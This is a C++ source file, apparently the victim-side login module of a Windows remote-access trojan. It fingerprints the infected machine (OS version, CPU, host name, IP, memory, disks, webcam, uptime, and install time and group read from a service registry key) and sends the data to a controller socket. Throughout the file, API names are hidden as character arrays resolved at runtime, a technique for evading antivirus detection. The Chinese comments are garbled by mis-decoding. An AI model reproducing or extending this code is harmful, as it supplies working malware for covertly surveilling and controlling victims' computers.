#include "../stdafx.h"
#include "../Declare.h"   //��̬���ÿ⺯��
#include <wininet.h>
#include <vfw.h>
#include "until.h"
#pragma comment(lib, "vfw32.lib")
#include "../Myfunction.h"  //�Զ��庯��

extern Myfunction *Gyfunction;

typedef struct
{	
	BYTE			bToken;			// = 1
	OSVERSIONINFOEX	OsVerInfoEx;	// �汾��Ϣ
	int				CPUClockMhz;	// CPU��Ƶ
	char			CPUNumber[20];	// CPU����
	IN_ADDR			IPAddress;		// �洢32λ��IPv4�ĵ�ַ���ݽṹ
	char			HostName[50];	// ������
	DWORD			MemSize;		// �ڴ��С
	DWORD			DriverSize;		// Ӳ������
	BOOL			bIsWebCam;		// �Ƿ�������ͷ
	DWORD			dwSpeed;		// ����
	char			Version[50];	// ����˰汾��Ϣ
	char			MarkTime[50];	// ����˰汾��Ϣ
	char			UpGroup[50];	// ���߷���
	char			RunTime[50];	// ����ʱ��
}LOGININFO;


///////////////////////////////////////////////////////////////////////////////////////////
typedef BOOL 
(VFWAPI 
*capGetDriverDescriptionAT)(
    UINT wDriverIndex,
    LPSTR lpszName, int cbName,
    LPSTR lpszVer, int cbVer
    );

typedef BOOL 
(VFWAPI 
*capGetDriverDescriptionAT)(
    UINT wDriverIndex,
    LPSTR lpszName, 
    int cbName,
    LPSTR lpszVer, 
    int cbVer);

///////////////////////////////////////////////////////////////////////////////////////////
// Get System Information
DWORD CPUClockMhzt()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;

	char CtxPW32[] = {'R','e','g','O','p','e','n','K','e','y','A','\0'};
    RegOpenKeyAT pRegOpenKeyA=(RegOpenKeyAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),CtxPW32);
	char JYvni03[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	pRegOpenKeyA(HKEY_LOCAL_MACHINE, JYvni03, &hKey);
	char strmhz[5];
	strmhz[0]='~';
	strmhz[1]='M';
	strmhz[2]='H';
	strmhz[3]='z';
	strmhz[4]='\0';
	char HrFvD13[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','E','x','A','\0'};
	RegQueryValueExAT pRegQueryValueExA=(RegQueryValueExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),"RegQueryValueExA");
	pRegQueryValueExA(hKey, strmhz, NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey(hKey);
	return	dwCPUMhz;
}

BOOL IsWebCam()
{
	BOOL	bRet = false;
	
	char	lpszName[100], lpszVer[50];

	char DYrEN15[] = {'c','a','p','G','e','t','D','r','i','v','e','r','D','e','s','c','r','i','p','t','i','o','n','A','\0'};
	capGetDriverDescriptionAT pcapGetDriverDescriptionA=(capGetDriverDescriptionAT)GetProcAddress(LoadLibrary("AVICAP32.dll"),DYrEN15);
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = pcapGetDriverDescriptionA(i, lpszName, sizeof(lpszName),lpszVer, sizeof(lpszVer));
	}
	return bRet;
}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey, JYvni08,lpServiceName);	
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
		gethostname(lpBuffer, uSize);

	return plstrlenA(lpBuffer);
}

UINT GetGroupName(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
//	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\Sinking");
	char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
	pwsprintfA(strSubKey, JYvni08,lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ConnectGroup", REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
	{
		lpBuffer = "Ĭ�Ϸ���";
	}

	return plstrlenA(lpBuffer);
}


UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s",lpServiceName);
	char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, JYvni04, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (plstrlenA(lpBuffer) == 0)
	{
		lpBuffer = "����Ϣ";
	}

	return plstrlenA(lpBuffer);
}

int sendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed,LPSTR szMakr)
{
	char jsbHj10[] = {'%','d','\0'};
	int nRet = SOCKET_ERROR;
	// ��¼��Ϣ
	LOGININFO	LoginInfo;
	// ��ʼ��������
	LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼
	LoginInfo.bIsWebCam = 0; //û������ͷ
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	char FBwWp05[] = {'G','e','t','V','e','r','s','i','o','n','E','x','A','\0'};
	GetVersionExAT pGetVersionExA=(GetVersionExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp05);
	pGetVersionExA((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
	// IP��Ϣ
	
	// ������
	char hostname[256];
	GetHostRemark(strServiceName, hostname, sizeof(hostname));

	// ���ӵ�IP��ַ
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);


	Gyfunction->my_memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	Gyfunction->my_memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));
	// CPU
	LoginInfo.CPUClockMhz = CPUClockMhzt();
	/*----------------------------------------------------------------------------------------*/	
	// CPU����
	OSVERSIONINFOEX OsVerInfoExx;
	OsVerInfoExx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	pGetVersionExA((OSVERSIONINFO *)&OsVerInfoExx); // ע��ת������

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (OsVerInfoExx.dwMajorVersion == 5 && OsVerInfoExx.dwMinorVersion == 0)
	{
		plstrcpyA(LoginInfo.CPUNumber, "1");
	}
	else
	{
		SYSTEM_INFO siSysInfo; 
		//����Ӳ����Ϣ��SYSTEM_INFO�ṹ����
		GetSystemInfoT pGetSystemInfo=(GetSystemInfoT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetSystemInfo");
		pGetSystemInfo(&siSysInfo); 	

		pwsprintfA(LoginInfo.CPUNumber, "%d", siSysInfo.dwNumberOfProcessors);
	}
	/*----------------------------------------------------------------------------------------*/
	
	//�ڴ��С
    MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
    MemInfo.dwLength=sizeof(MemInfo); 
	char JYvni05[] = {'G','l','o','b','a','l','M','e','m','o','r','y','S','t','a','t','u','s','E','x','\0'};
	GlobalMemoryStatusExT pGlobalMemoryStatusEx=(GlobalMemoryStatusExT)GetProcAddress(LoadLibrary("KERNEL32.dll"),JYvni05);
    pGlobalMemoryStatusEx(&MemInfo);
	LoginInfo.MemSize = (unsigned long)MemInfo.ullTotalPhys/1024/1024;

	//Ӳ�̿ռ�
	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];//, strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;

		char FBwWp07[] = {'G','e','t','D','r','i','v','e','T','y','p','e','A','\0'};
		GetDriveTypeAT pGetDriveTypeA=(GetDriveTypeAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp07);
		drivertype = pGetDriveTypeA(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		char FBwWp09[] = {'G','e','t','D','i','s','k','F','r','e','e','S','p','a','c','e','E','x','A','\0'};
		GetDiskFreeSpaceExAT pGetDiskFreeSpaceExA=(GetDiskFreeSpaceExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp09);
		pGetDiskFreeSpaceExA(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
//		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //ʣ�����
    }
	// Ӳ��
	LoginInfo.DriverSize = nAllGB;

	// ��Ƶ
	LoginInfo.bIsWebCam = IsWebCam();

	// ����
	LoginInfo.dwSpeed = dwSpeed;

	// ��������ʱ��
	char DYrEN70[] = {'G','e','t','T','i','c','k','C','o','u','n','t','\0'};
	GetTickCountT pGetTickCount=(GetTickCountT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN70);
	DWORD t=pGetTickCount();
	char day[100];
	char hour[100];
	char min[100];
	pwsprintfA(day, jsbHj10, t/86400000);
	t%=86400000;
	pwsprintfA(hour,jsbHj10, t/3600000);
	t%=3600000;
	pwsprintfA(min, jsbHj10, t/60000);
	pwsprintfA(LoginInfo.RunTime, "%s��%sʱ%s��", day, hour,min);

    //����汾
	strcpy(LoginInfo.Version,szMakr);

	//����װʱ��
	GetMarkTime(strServiceName, LoginInfo.MarkTime, sizeof(LoginInfo.MarkTime));

	//���߷���
	GetGroupName(strServiceName, LoginInfo.UpGroup, sizeof(LoginInfo.UpGroup));

	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));



	return nRet;
}
